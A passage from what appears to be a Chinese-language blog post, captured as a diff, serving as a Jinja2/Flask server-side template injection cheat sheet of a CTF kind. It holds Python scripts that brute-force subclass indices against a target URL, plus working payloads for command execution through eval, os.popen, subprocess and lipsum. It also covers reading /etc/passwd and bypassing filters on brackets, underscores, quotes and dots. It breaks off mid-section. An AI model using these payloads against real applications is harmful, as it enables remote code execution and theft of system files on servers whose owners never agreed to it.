+</div>
+</div><p>或者直接利用题目环境直接搜出来，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">查看warnings.catch_warnings方法的位置
+[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
+查看linecatch的位置
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&#39;linecache&#39;)
+
+剩下的以此类推
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="rce">RCE</h2>
+<h3 id="eval">eval</h3>
+<p>首先，题目环境的不一样可能需要我们去找环境中含有内建函数 eval 的子类的索引号</p>
+<p>这里脚本的原理就是通过遍历<code>__subclasses__</code>，然后再通过<code>.__init__.__globals__['__builtins__']</code>里面找是否存在eval函数字眼</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;].__init__.__globals__[&#39;__builtins__&#39;]}}&#34;</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;eval&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们可以记下几个含有eval函数的类：</p>
+<ul>
+<li>warnings.catch_warnings</li>
+<li>WarningMessage</li>
+<li>codecs.IncrementalEncoder</li>
+<li>codecs.IncrementalDecoder</li>
+<li>codecs.StreamReaderWriter</li>
+<li>os._wrap_close</li>
+<li>reprlib.Repr</li>
+<li>weakref.finalize</li>
+</ul>
+<p>示例payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="os模块">os模块</h3>
+<p>Python的 os 模块中有system和popen这两个函数可用来执行命令，system没有回显，popen有回显</p>
+<p>而找os模块的方法就和上面的差不多，可以编写脚本，遍历subclass的类里的<code>__init__.__globals__</code></p>
+<p>查找里面有没有导入os模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;].__init__.__globals__}}&#34;</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;os.py&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>示例payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="subprocesspopen类">subprocess.popen类</h3>
+<p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;]}}&#34;</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;linecache&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>则构造如下payload执行命令即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{[]</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">245</span><span class="p">](</span><span class="s1">&#39;ls /&#39;</span><span class="p">,</span><span class="nx">shell</span><span class="o">=</span><span class="k">True</span><span class="p">,</span><span class="nx">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="nx">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">strip</span><span class="p">()}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="linecache-函数">linecache 函数</h3>
+<p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()[&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;].__init__.__globals__}}&#34;</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;linecache&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>示例payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls /&#39;).read()}}{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#39;ls /&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="lipsum">lipsum</h3>
+<p>前段时间兴起的一条路，非常方便的可以进行rce</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+<span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+<span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="文件读取">文件读取</h2>
+<p>如果实在没有命令执行，那就看看有没有文件读取的操作</p>
+<p>python2中file类可以直接用来读取文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{[].__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><p>python3中没有这个file类，可以用<code>&lt;class '_frozen_importlib_external.FileLoader'&gt; </code>这个类去读取文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">import requests
+
+for i in range(500):
+    url = &#34;http://xxx/?name={{().__class__.__bases__[0].__subclasses__()[&#34;+str(i)+&#34;]}}&#34;
+
+    res = requests.get(url=url, headers=headers)
+    if &#39;FileLoader&#39; in res.text:
+        print(i)
+</code></pre></td></tr></table>
+</div>
+</div><p>示例payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{().__class__.__bases__[0].__subclasses__()[79][&#34;get_data&#34;](0, &#34;/etc/passwd&#34;)}}
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="bypass">Bypass</h1>
+<h2 id="heading">{{</h2>
+<p>绕过方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{%print()%}
+{% if ... %}1{% endif %}
+{%set c=xxx %}
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="heading-1">[]</h2>
+<p>过滤了[]后，我们payload有几个地方就过不去了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="getitem">getitem</h3>
+<p>那么这里就可以利用函数<code>getitem()</code>进行获取列表元素，payload就变成这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220724000650617.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220724000650617.png, https://tuchuang.huamang.xyz/img/image-20220724000650617.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220724000650617.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220724000650617.png"
+        title="image-20220724000650617" /></p>
+<h3 id="pop">pop</h3>
+<p>最好不要用pop()，因为pop()会删除相应位置的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()}}// 指定序列属性
+
+{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}// 指定字典属性
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="字典">字典</h3>
+<p>我们知道访问字典里的值有两种方法，一种是把相应的键放入熟悉的方括号 <code>[]</code> 里来访问，一种就是用点 <code>.</code> 来访问。所以，当方括号 <code>[]</code> 被过滤之后，我们还可以用点 <code>.</code> 的方式来访问，如下示例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">__builtins__</span><span class="o">.</span><span class="k">eval</span><span class="p">()</span>
+
+<span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="o">.</span><span class="nx">__getitem__</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="o">.</span><span class="nx">__builtins__</span><span class="o">.</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>等同于：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">[</span><span class="nx">__builtins__</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">]()</span>
+
+<span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class="p">)}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="_">_</h2>
+<p>利用request对象绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()[</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">class</span><span class="p">][</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">bases</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">subclasses</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="nx">class</span><span class="o">=</span><span class="no">__class__</span><span class="o">&amp;</span><span class="nx">bases</span><span class="o">=</span><span class="nx">__bases__</span><span class="o">&amp;</span><span class="nx">subclasses</span><span class="o">=</span><span class="nx">__subclasses__</span>
+
+<span class="p">{{()[</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">class</span><span class="p">][</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">bases</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">subclasses</span><span class="p">]()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span><span class="o">&amp;</span><span class="nx">class</span><span class="o">=</span><span class="no">__class__</span><span class="o">&amp;</span><span class="nx">bases</span><span class="o">=</span><span class="nx">__bases__</span><span class="o">&amp;</span><span class="nx">subclasses</span><span class="o">=</span><span class="nx">__subclasses__</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>等同于：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="nx">pop</span><span class="p">(</span><span class="mi">40</span><span class="p">)(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="引号">引号'</h2>
+<h3 id="利用chr绕过">利用chr()绕过</h3>
+<p>先获取chr()函数，赋值给chr，后面再拼接成一个字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{% set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
+
+# {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
+
+等同
+{{().__class__.__bases__[0].__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="利用request对象绕过">利用request对象绕过</h3>
+<p>示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd
+
+{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&amp;os=os&amp;cmd=ls /
+
+等同于：
+
+{{().__class__.__bases__[0].__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()}}
+
+{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
+</code></pre></td></tr></table>
+</div>
+</div><p>如果过滤了args，可以将其中的request.args改为request.values，POST和GET两种方法传递的数据request.values都可以接收。</p>
+<h2 id="点">点.</h2>
+<h3 id="利用-attr-绕过适用于flask">利用 <code>|attr()</code> 绕过（适用于flask）</h3>
+<p>如果 <code>.</code> 也被过滤，且目标是JinJa2（flask）的话，可以使用原生JinJa2函数<code>attr()</code>，即：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">()</span><span class="o">.</span><span class="no">__class__</span>   <span class="o">=&gt;</span>  <span class="p">()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__class__&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>示例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__class__&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__base__&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__subclasses__&#34;</span><span class="p">)()</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__getitem__&#34;</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__init__&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__globals__&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;__getitem__&#34;</span><span class="p">)(</span><span class="s2">&#34;os&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;popen&#34;</span><span class="p">)(</span><span class="s2">&#34;ls /&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">attr</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)()}}</span>
+
+<span class="nx">等同于</span>
+<span class="p">{{()</span><span class="o">.</span><span class="no">__class__</span><span class="o">.</span><span class="nx">__base__</span><span class="o">.</span><span class="nx">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="nx">__init__</span><span class="o">.</span><span class="nx">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="nx">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">read</span><span class="p">()}}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="利用中括号-绕过">利用中括号[ ]绕过</h3>
+<p>如下示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="s1">&#39;__class__&#39;</span><span class="p">][</span><span class="s1">&#39;__bases__&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">]()[</span><span class="mi">59</span><span class="p">][</span><span class="s1">&#39;__init__&#39;</span><span class="p">][</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;</span><span class="p">)}}</span>
+
+<span class="nx">等同于：</span>
+
